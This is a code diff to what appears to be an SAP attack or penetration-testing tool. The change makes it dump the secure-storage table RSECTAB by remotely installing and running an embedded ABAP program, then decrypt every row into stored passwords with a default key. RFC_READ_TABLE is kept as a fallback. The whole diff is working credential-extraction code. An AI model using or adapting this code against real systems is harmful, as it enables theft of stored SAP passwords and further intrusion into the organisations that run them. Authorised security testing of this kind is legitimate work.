@@ -173,33 +173,62 @@ def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
 
 
 # ---------------------------------------------------------------------------
+# ABAP program to read RSECTAB with proper hex encoding of the RAW field
+# ---------------------------------------------------------------------------
+
+# RFC_READ_TABLE cannot reliably handle RAW(184) fields: binary data may
+# contain the pipe delimiter and break row parsing.  Instead we run a tiny
+# ABAP report via RFC_ABAP_INSTALL_AND_RUN that reads RSECTAB, hex-encodes
+# the DATA field, and writes one line per row as  IDENT~~~hex_DATA .
+_ABAP_READ_RSECTAB = [
+    "REPORT ZSECSTORE.",
+    "TABLES: RSECTAB.",
+    "DATA: HEX TYPE STRING.",
+    "DATA: BYTE TYPE X LENGTH 1.",
+    "DATA: HEXC(2) TYPE C.",
+    "DATA: OFF TYPE I.",
+    "SELECT * FROM RSECTAB.",
+    "  CLEAR HEX.",
+    "  OFF = 0.",
+    "  WHILE OFF < 184.",
+    "    BYTE = RSECTAB-DATA+OFF(1).",
+    "    WRITE BYTE TO HEXC.",
+    "    CONCATENATE HEX HEXC INTO HEX.",
+    "    OFF = OFF + 1.",
+    "  ENDWHILE.",
+    "  WRITE: / RSECTAB-IDENT, '~~~', HEX.",
+    "ENDSELECT.",
+]
+
+
+# ---------------------------------------------------------------------------
 # Main entry point: read RSECTAB and decrypt all rows
 # ---------------------------------------------------------------------------
 
 def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
     """
-    1. Read RSECTAB via RFC_READ_TABLE (fields: IDENT, DATA).
+    1. Read RSECTAB via ABAP program (hex-encodes the RAW DATA field).
     2. Decrypt each row.
     3. Return a list of dicts: ident, password, sid, instance_nr, error.
     """
     _require_crypto()
 
-    rows = sapmap_rfc.read_table(
-        node,
-        "RSECTAB",
-        fields=["IDENT", "DATA"],
-        where="",
-        max_rows=9999,
-        creds=creds,
-    )
+    # --- Try ABAP execution first (reliable for RAW fields) ---------------
+    rows = _read_rsectab_via_abap(node, creds)
+
+    if rows is None:
+        # Fall back to RFC_READ_TABLE (may work on some systems)
+        print("[*] SecStore: ABAP exec unavailable, falling back to RFC_READ_TABLE")
+        rows = _read_rsectab_via_rfc(node, creds)
+
+    if not rows:
+        print(f"[-] SecStore {node.sid}: no rows returned from RSECTAB")
+        return []
+
+    print(f"[*] SecStore {node.sid}: {len(rows)} rows read, decrypting...")
 
     results = []
-    for row in rows:
-        ident    = (row.get("IDENT") or "").strip()
-        data_hex = (row.get("DATA")  or "").strip()
-        # RFC_READ_TABLE returns RAW fields as uppercase hex; normalise
-        data_hex = data_hex.replace(" ", "").upper()
-
+    for ident, data_hex in rows:
         entry = {"ident": ident}
 
         if not data_hex:
@@ -209,7 +238,7 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
 
         if len(data_hex) != _DATA_LEN_BYTES * 2:
             entry["error"] = (
-                "DATA field length %d chars (expected %d)"
+                "DATA field length %d hex chars (expected %d)"
                 % (len(data_hex), _DATA_LEN_BYTES * 2)
             )
             results.append(entry)
@@ -220,6 +249,57 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
         results.append(entry)
 
     return results
+
+
+def _read_rsectab_via_abap(node, creds) -> list | None:
+    """Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN.
+
+    Returns list of (ident, data_hex) tuples, or None if the FM is not
+    available.
+    """
+    try:
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_RSECTAB,
+                                                "ZSECSTORE")
+            if not res.get("success") and "not available" in (res.get("error") or ""):
+                return None  # FM not available — caller will fall back
+
+            if not res.get("success"):
+                print(f"[-] SecStore ABAP exec error: {res.get('error')}")
+                return None
+
+            rows = []
+            for line in res.get("output", []):
+                if "~~~" not in line:
+                    continue
+                parts = line.split("~~~", 1)
+                ident    = parts[0].strip()
+                data_hex = parts[1].strip().replace(" ", "").upper()
+                rows.append((ident, data_hex))
+            return rows
+
+    except Exception as e:
+        print(f"[-] SecStore ABAP read failed: {e}")
+        return None
+
+
+def _read_rsectab_via_rfc(node, creds) -> list | None:
+    """Fallback: read RSECTAB via RFC_READ_TABLE (unreliable for RAW fields)."""
+    try:
+        raw_rows = sapmap_rfc.read_table(
+            node, "RSECTAB",
+            fields=["IDENT", "DATA"],
+            where="", max_rows=9999, creds=creds,
+        )
+        rows = []
+        for r in raw_rows:
+            ident    = (r.get("IDENT") or "").strip()
+            data_hex = (r.get("DATA") or "").strip().replace(" ", "").upper()
+            rows.append((ident, data_hex))
+        return rows
+    except Exception as e:
+        print(f"[-] SecStore RFC_READ_TABLE failed: {e}")
+        return None
 
 
 # ---------------------------------------------------------------------------
